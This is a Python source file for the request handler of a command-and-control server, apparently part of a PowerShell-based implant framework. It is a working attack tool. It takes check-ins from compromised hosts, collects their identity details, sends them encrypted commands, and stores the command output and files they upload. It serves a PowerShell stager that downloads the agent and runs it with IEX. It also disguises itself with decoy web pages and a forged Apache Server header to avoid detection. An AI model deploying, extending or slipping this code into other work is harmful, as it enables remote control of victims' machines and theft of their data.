# Modified C2RequestHandler class with key rotation support

import http.server
import json
import base64
import os
import time
from datetime import datetime
from core.utils.client_identity import extract_system_info
from core.utils.path_rotation import PathRotationManager

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Handles client check-ins, commands, and file transfers with encryption
    Supports dynamic URL paths and client-specific key rotation after verification
    """
    
    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
        self.client_manager = client_manager
        self.logger = logger
        self.crypto_manager = crypto_manager
        self.campaign_name = campaign_name
        
        # Set default URL paths
        self.default_paths = {
            "beacon_path": "/beacon",
            "agent_path": "/raw_agent",
            "stager_path": "/b64_stager",
            "cmd_result_path": "/command_result",
            "file_upload_path": "/file_upload"
        }
        
        # Update with custom paths if provided
        initial_paths = self.default_paths.copy()
        if url_paths:
            initial_paths.update(url_paths)
            
        # Make sure all paths start with '/'
        for key, path in initial_paths.items():
            if not path.startswith('/'):
                initial_paths[key] = '/' + path
        
        # Initialize path rotation if server has it
        self.path_manager = None
        if hasattr(server, 'path_manager'):
            self.path_manager = server.path_manager
        else:
            # Create path rotation manager if not already on server
            campaign_folder = f"{campaign_name}_campaign"
            rotation_interval = getattr(server, 'path_rotation_interval', 3600)  # Default 1 hour
            self.path_manager = PathRotationManager(
                campaign_folder, 
                logger, 
                initial_paths=initial_paths,
                rotation_interval=rotation_interval
            )
            # Load existing state if available
            self.path_manager.load_state()
            # Attach to server for other handlers to use
            server.path_manager = self.path_manager
        
        # Check if rotation is needed
        self.path_manager.check_rotation()
        
        # Get current paths from rotation manager
        self.url_paths = self.path_manager.get_current_paths()
        
        # Cache path mapping for quick lookups
        self.path_mapping = {}
        self._update_path_mapping()
                
        super().__init__(request, client_address, server)

    def _update_path_mapping(self):
        """Update the path mapping for quick lookups of which endpoint a path maps to"""
        self.path_mapping = {}
        
        # Add current paths to mapping
        for key, path in self.url_paths.items():
            self.path_mapping[path] = key
        
        # Also add previous rotation's paths for graceful transition
        if self.path_manager.rotation_counter > 0:
            previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
            if previous_paths:
                for key, path in previous_paths.items():
                    if path not in self.path_mapping:  # Don't overwrite current paths
                        self.path_mapping[path] = f"previous_{key}"

    def log_message(self, format, *args):
        self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def get_client_key(self, client_id):
        """Get the appropriate encryption key for a client"""
        # Use client-specific key if available, otherwise use campaign key
        if hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
            return self.client_manager.client_keys[client_id]
        # Fall back to campaign-wide key
        return self.crypto_manager.key

    def encrypt_for_client(self, data, client_id):
        """Encrypt data specifically for a client using their key if available"""
        key = self.get_client_key(client_id)
        
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Generate a random IV
        iv = os.urandom(16)
        
        # Encrypt the data using the same method from crypto_manager
        # but with client-specific key
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        # Add padding manually (simple PKCS7-like padding)
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padded_data = data + bytes([padding_length]) * padding_length
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV and ciphertext and base64 encode
        return base64.b64encode(iv + ciphertext).decode('utf-8')
    
    def decrypt_from_client(self, encrypted_data, client_id):
        """Decrypt data from a client using their key if available"""
        key = self.get_client_key(client_id)
        
        # Decode the base64
        encrypted_bytes = base64.b64decode(encrypted_data)
        
        # Extract the IV and ciphertext
        iv = encrypted_bytes[:16]
        ciphertext = encrypted_bytes[16:]
        
        # Decrypt the ciphertext
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove padding manually
        padding_length = padded_data[-1]
        data = padded_data[:-padding_length]
        
        return data.decode('utf-8')

    def do_GET(self):
        # Check if rotation is needed before handling request
        if self.path_manager.check_rotation():
            self.url_paths = self.path_manager.get_current_paths()
            self._update_path_mapping()
            self.logger(f"Paths rotated during request handling: {self.url_paths}")

        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        # Look up the path in our mapping
        path_type = self.path_mapping.get(self.path)
        
        # Handle request based on path type
        if path_type == "agent_path" or path_type == "previous_agent_path":
            self.send_agent_response()
        elif path_type == "stager_path" or path_type == "previous_stager_path":
            self.send_b64_stager_response()
        elif path_type == "beacon_path" or path_type == "previous_beacon_path":
            self.handle_beacon()
        else:
            # Check if this is a dynamically generated path from an older rotation
            for previous_rotation in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
                previous_paths = self.path_manager.get_path_by_rotation_id(previous_rotation)
                if previous_paths:
                    for key, path in previous_paths.items():
                        if path == self.path:
                            # It's an old path, handle it accordingly
                            if key == "beacon_path":
                                self.logger(f"Request to old beacon path from rotation {previous_rotation}")
                                self.handle_beacon(include_rotation_info=True)
                                return
                            elif key == "agent_path":
                                self.send_agent_response()
                                return
                            elif key == "stager_path":
                                self.send_b64_stager_response()
                                return
            
            # Default response for unmatched paths - provide a generic 200 response
            # This helps make the server look like a legitimate web server
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            
            # Return a generic-looking webpage to further avoid detection
            message = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Website</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                    .container { max-width: 800px; margin: 0 auto; }
                    h1 { color: #333; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>Welcome</h1>
                    <p>This page is currently under maintenance. Please check back later.</p>
                </div>
            </body>
            </html>
            """
            self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self, include_rotation_info=False):
        """Process check-in requests from clients"""
        ip = self.client_address[0]
        self.logger(f"Beacon received from {ip}")
        
        # Check for system information in headers
        system_info_encrypted = self.headers.get('X-System-Info')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        
        # Extract rotation info from headers (if client is using path rotation)
        client_rotation_id = self.headers.get('X-Rotation-ID')
        if client_rotation_id:
            try:
                client_rotation_id = int(client_rotation_id)
                if client_rotation_id < self.path_manager.rotation_counter:
                    self.logger(f"Client using outdated rotation ID {client_rotation_id}, current is {self.path_manager.rotation_counter}")
                    include_rotation_info = True
            except ValueError:
                pass
        
        identified_client_id = None
        
        if system_info_encrypted:
            try:
                # Decrypt the system information
                system_info_json = self.crypto_manager.decrypt(system_info_encrypted)
                
                # Extract key system properties
                hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                
                # Add IP to system info
                system_info['ip'] = ip
                
                # Add unique client identifier if provided
                if client_identifier:
                    system_info['client_identifier'] = client_identifier
                    
                    # Important: Check if this client_identifier is already known
                    # This helps with re-identifying clients after key rotation
                    for existing_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                            identified_client_id = existing_id
                            self.logger(f"Recognized returning client with identifier {client_identifier} as {identified_client_id}")
                            break
                
                # If we identified the client by identifier, use that ID, otherwise generate a new one
                client_id = identified_client_id
                if not client_id:
                    client_id = self.client_manager.add_client(
                        ip=ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                else:
                    # Update the existing client information
                    self.client_manager.add_client(
                        ip=ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                
                # Keep track of whether key rotation is needed
                key_rotation_needed = False
                is_verified = False
                
                # Verify client identity if verifier is available
                if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
                    verifier = self.server.client_verifier
                    is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
                    
                    # Add logging for verification status
                    self.logger(f"Verification result for {client_id}: verified={is_verified}, confidence={confidence}")
                    
                    # Update client verification status
                    self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
                    self.logger(f"Set verification status for {client_id}: {is_verified} with confidence {confidence}")
                    
                    # Debug log to see what's in the client info after setting verification
                    client_updated = self.client_manager.get_clients_info().get(client_id, {})
                    verification_status = client_updated.get("verification_status", {})
                    self.logger(f"Updated client verification status: {verification_status}")
                    
                    # Check if client needs key rotation using the has_unique_key method if available
                    has_unique_key = False
                    if hasattr(self.client_manager, 'has_unique_key'):
                        has_unique_key = self.client_manager.has_unique_key(client_id)
                    else:
                        # Fallback to direct check
                        has_unique_key = hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
                    
                    # Only rotate key if verified and doesn't already have a key
                    if is_verified and not has_unique_key:
                        key_rotation_needed = True
                        self.logger(f"Client {client_id} verified and eligible for key rotation")
                    
                    # Check for manual key rotation request 
                    requested_key_rotation = False
                    for cmd in self.client_manager.get_pending_commands(client_id):
                        if cmd.get('command_type') == 'key_rotation':
                            # Mark rotation as needed even if the client already has a key
                            # This allows manual rotation of keys when requested
                            requested_key_rotation = True
                            self.logger(f"Manual key rotation requested for client {client_id}")
                            break

                    # Decide if key rotation is needed
                    key_rotation_needed = (is_verified and (not has_unique_key or requested_key_rotation))
                    
                    if not is_verified:
                        warning_str = ", ".join(warnings)
                        self.logger(f"WARNING: Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
                    
                    # Register/update this client information for future reference
                    verifier.register_client(client_id, system_info)
                
                self.logger(f"Client identified as {client_id} ({hostname}/{username})")
                
                # Debug log to check key status
                if hasattr(self.client_manager, 'client_keys'):
                    has_key = client_id in self.client_manager.client_keys
                    self.logger(f"Key status for {client_id}: has_unique_key={has_key}")
                else:
                    self.logger(f"Client manager does not have client_keys attribute")
                    
                # Also check if key_rotation_time is in client info
                client_info = self.client_manager.get_clients_info().get(client_id, {})
                if 'key_rotation_time' in client_info:
                    self.logger(f"Client {client_id} has key_rotation_time: {client_info['key_rotation_time']}")
                    
            except Exception as e:
                self.logger(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = ip
                self.client_manager.add_client(client_id)
        else:
            # Fall back to IP-based identification for compatibility
            client_id = ip
            self.client_manager.add_client(client_id)
        
        commands = self.client_manager.get_pending_commands(client_id)
        self.logger(f"Commands to send to client {client_id}: {commands}")
        
        # If a key rotation command is in the queue, move it to the front
        # This ensures key rotation happens before other commands
        has_key_rotation = False
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_rotation = True
                # Move it to the front if it's not already
                if i > 0:
                    rotation_command = commands.pop(i)
                    commands.insert(0, rotation_command)
                break
        
        # Add key rotation command if needed and the client has been verified
        if key_rotation_needed:
            # Generate a new unique key for this client
            new_key = os.urandom(32)  # 256-bit key
            base64_key = base64.b64encode(new_key).decode('utf-8')
            
            # Store the client's unique key
            self.client_manager.set_client_key(client_id, new_key)
            
            # Create key rotation command
            key_rotation_command = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "command_type": "key_rotation",
                "args": base64_key
            }
            
            # Add to the beginning of the command list to ensure it's processed first
            commands.insert(0, key_rotation_command)
            has_key_rotation = True
            self.logger(f"Key rotation command issued for client {client_id}")
        
        # Log the command sent to the client
        for command in commands:
            self.client_manager.log_event(
                client_id, 
                "Command send", 
                f"Type: {command['command_type']}, Args: {command['args'] if command['command_type'] != 'key_rotation' else '[REDACTED KEY]'}"
            )
        
        # Add path rotation information if needed
        if include_rotation_info:
            rotation_info = self.path_manager.get_rotation_info()
            rotation_command = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "command_type": "path_rotation",
                "args": {
                    "rotation_id": rotation_info["current_rotation_id"],
                    "next_rotation_time": rotation_info["next_rotation_time"],
                    "paths": rotation_info["current_paths"]
                }
            }
            commands.append(rotation_command)
            self.logger(f"Sending path rotation info to client {client_id}: Rotation {rotation_info['current_rotation_id']}")
        
        # Encrypt commands json before sending
        commands_json = json.dumps(commands)
        
        # Use client-specific key if available, otherwise use the campaign key
        encrypted_commands = self.encrypt_for_client(commands_json, client_id)
        
        # Send encrypted data
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        # Include current rotation ID in header to keep client in sync
        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
        self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
        
        # Add a key rotation flag to help client know how to handle response
        if has_key_rotation:
            self.send_header("X-Key-Rotation", "true")
        
        self.end_headers()
        self.wfile.write(encrypted_commands.encode("utf-8"))
        
        # Only clear pending commands if we actually sent them
        # This ensures we don't lose commands during key rotation
        if not has_key_rotation:
            self.client_manager.clear_pending_commands(client_id)
        else:
            # If key rotation is happening, only clear the key rotation command
            # and keep other commands in the queue
            pending_commands = self.client_manager.get_pending_commands(client_id)
            new_pending = []
            for cmd in pending_commands:
                if cmd.get('command_type') != 'key_rotation':
                    new_pending.append(cmd)
            
            # Temporarily clear all commands
            self.client_manager.clear_pending_commands(client_id)
            
            # Add back the non-key-rotation commands
            for cmd in new_pending:
                self.client_manager.add_command(
                    client_id, 
                    cmd.get('command_type'), 
                    cmd.get('args')
                )

    def _get_campaign_name(self):
        """Helper method to get the active campaign name"""
        # Use the campaign name provided during initialization if available
        if self.campaign_name:
            return self.campaign_name
            
        # Otherwise, try to find campaign directories
        campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
        if not campaign_dirs:
            return None
        # For now, just use the first campaign found
        return campaign_dirs[0][:-9]  # Remove "_campaign" suffix
    
    def send_agent_response(self):
        """Send the PowerShell agent code with path rotation support"""
        from core.utils.agent_generator import generate_agent_code
        
        # Get the key as base64
        key_base64 = self.crypto_manager.get_key_base64()
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Get current paths
        current_paths = self.path_manager.get_current_paths()
        
        # Get rotation information
        rotation_info = self.path_manager.get_rotation_info()
        
        # Generate the agent code with custom URL paths and rotation info
        agent_code = generate_agent_code(
            key_base64, 
            server_address, 
            beacon_path=current_paths["beacon_path"],
            cmd_result_path=current_paths["cmd_result_path"],
            file_upload_path=current_paths["file_upload_path"],
            rotation_info=rotation_info  # Pass rotation info to the agent generator
        )

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Add some legitimate-looking headers to blend in with normal web traffic
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_b64_stager_response(self):
        """Send a Base64 encoded stager that will download and execute the agent"""
        # Use the current agent path
        current_paths = self.path_manager.get_current_paths()
        agent_path = current_paths["agent_path"]
        
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{agent_path}');IEX($S)"
        
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        # Add some legitimate-looking headers to blend in with normal web traffic
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))

    def do_POST(self):
        """Handle POST requests for command results and file uploads"""
        # Check if rotation is needed before handling request
        if self.path_manager.check_rotation():
            self.url_paths = self.path_manager.get_current_paths()
            self._update_path_mapping()
        
        # Log the request details
        self.log_message(f"Received POST request for {self.path}")

        # Look up the path in our mapping
        path_type = self.path_mapping.get(self.path)
        
        if path_type == "cmd_result_path" or path_type == "previous_cmd_result_path":
            self.handle_command_result()
        elif path_type == "file_upload_path" or path_type == "previous_file_upload_path":
            self.handle_file_upload()
        else:
            # Check if this is a dynamically generated path from an older rotation
            for previous_rotation in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
                previous_paths = self.path_manager.get_path_by_rotation_id(previous_rotation)
                if previous_paths:
                    for key, path in previous_paths.items():
                        if path == self.path:
                            # It's an old path, handle it accordingly
                            if key == "cmd_result_path":
                                self.handle_command_result()
                                return
                            elif key == "file_upload_path":
                                self.handle_file_upload()
                                return
            
            # Return a generic 404 or 200 response to avoid detection
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

    def handle_command_result(self):
        """Process command results sent from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        identified_client_id = None
        
        if client_identifier:
            # If we have a client identifier header, use it for logging
            self.logger(f"Result received from client ID {client_identifier} (IP: {ip})")
            
            # Try to find the actual client_id from the identifier
            for client_id, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    identified_client_id = client_id
                    break
        
        # Decrypt the result using the appropriate key
        try:
            # If we identified a client, use their key if available
            if identified_client_id:
                result_data = self.decrypt_from_client(encrypted_data, identified_client_id)
            else:
                # Try finding client by IP and use their key
                client_id_by_ip = None
                for client_id, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        client_id_by_ip = client_id
                        break
                
                if client_id_by_ip:
                    result_data = self.decrypt_from_client(encrypted_data, client_id_by_ip)
                else:
                    # Fall back to campaign-wide key
                    result_data = self.crypto_manager.decrypt(encrypted_data)
            
            # Try to parse the result as JSON
            try:
                result_json = json.loads(result_data)
                if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                    # This is a structured result with timestamp
                    timestamp = result_json['timestamp']
                    result = result_json['result']
                    
                    # Find the client by either client_id or IP
                    client_found = False
                    client_to_use = identified_client_id
                    
                    if not client_to_use:
                        for client_id, client_info in self.client_manager.get_clients_info().items():
                            # Check if this client has the matching client_identifier
                            if client_identifier and client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                                client_to_use = client_id
                                client_found = True
                                break
                            # Fallback to IP if no client_identifier match
                            if client_info.get('ip') == ip:
                                client_to_use = client_id
                                client_found = True
                                break
                    else:
                        client_found = True
                    
                    if client_found:
                        self.client_manager.add_command_result(client_to_use, timestamp, result)
                        self.logger(f"Result processed for client {client_to_use} (timestamp: {timestamp})")
                    else:
                        # If no client was found, log as a generic result
                        self.logger(f"Result received from unknown client {ip}: {result_data}")
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
                else:
                    # Unstructured result, log as is
                    self.logger(f"Result received from {ip}: {result_data}")
                    
                    # Try to find client by IP
                    for client_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('ip') == ip:
                            self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                            break
                    else:
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            except json.JSONDecodeError:
                # Not JSON, treat as plain text result
                self.logger(f"Result received from {ip}: {result_data}")
                
                # Try to find client by IP
                for client_id, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                        break
                else:
                    self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            # Include current rotation ID in header to keep client in sync
            self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
            self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
            self.end_headers()
            self.wfile.write(b"OK")  # Simple response to look more generic
        except Exception as e:
            self.logger(f"Error decrypting result from {ip}: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bad Request")  # Generic error message

    def handle_file_upload(self):
        """Process file uploads from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # Extract client identifier from headers if present
            client_identifier = self.headers.get('X-Client-ID')
            identified_client_id = None
            
            if client_identifier:
                # Try to find the client ID from the identifier
                for client_id, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                        identified_client_id = client_id
                        break
            
            # Decrypt the file data using the appropriate key
            if identified_client_id:
                file_content = self.decrypt_from_client(encrypted_data, identified_client_id)
            else:
                # Try finding client by IP
                client_id_by_ip = None
                for client_id, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        client_id_by_ip = client_id
                        break
                
                if client_id_by_ip:
                    file_content = self.decrypt_from_client(encrypted_data, client_id_by_ip)
                else:
                    # Fall back to campaign key
                    file_content = self.crypto_manager.decrypt(encrypted_data)
            
            # Create uploads directory if it doesn't exist
            campaign_name = self._get_campaign_name()
            if not campaign_name:
                self.send_error(500, "Campaign not found")
                return
                
            campaign_folder = campaign_name + "_campaign"
            
            # Try to determine client ID from the identifier or IP
            client_id = identified_client_id
            
            if not client_id:
                # Try to find by IP
                for cid, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        client_id = cid
                        break
            
            # Fallback to IP if no client ID found
            uploads_folder = os.path.join(campaign_folder, "uploads", client_id or ip)
            os.makedirs(uploads_folder, exist_ok=True)
            
            # Try to parse as JSON (might be a file info structure)
            try:
                file_info = json.loads(file_content)
                if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                    # This is a structured file upload
                    file_name = file_info['FileName']
                    file_content_base64 = file_info['FileContent']
                    file_content_bytes = base64.b64decode(file_content_base64)
                    
                    file_path = os.path.join(uploads_folder, file_name)
                    with open(file_path, 'wb') as f:
                        f.write(file_content_bytes)
                    
                    self.logger(f"File uploaded from {client_id or ip}: {file_name} ({len(file_content_bytes)} bytes)")
                    if client_id:
                        self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
                else:
                    # Not a structured file upload, save as raw text
                    timestamp = time.strftime("%Y%m%d-%H%M%S")
                    file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
                    
                    with open(file_path, 'w') as f:
                        f.write(file_content)
                        
                    self.logger(f"Raw text uploaded from {client_id or ip} and saved to {file_path}")
                    if client_id:
                        self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            except json.JSONDecodeError:
                # Not JSON, save as raw text
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
                
                with open(file_path, 'w') as f:
                    f.write(file_content)
                    
                self.logger(f"Raw text uploaded from {client_id or ip} and saved to {file_path}")
                if client_id:
                    self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            # Include current rotation ID in header to keep client in sync
            self.send_header("X-Rotation-ID", str(self.path_manager.rotation_counter))
            self.send_header("X-Next-Rotation", str(self.path_manager.get_next_rotation_time()))
            self.end_headers()
            self.wfile.write(b"OK")  # Simple response to look more generic
            
        except Exception as e:
            self.logger(f"Error handling file upload from {ip}: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server Error")  # Generic error message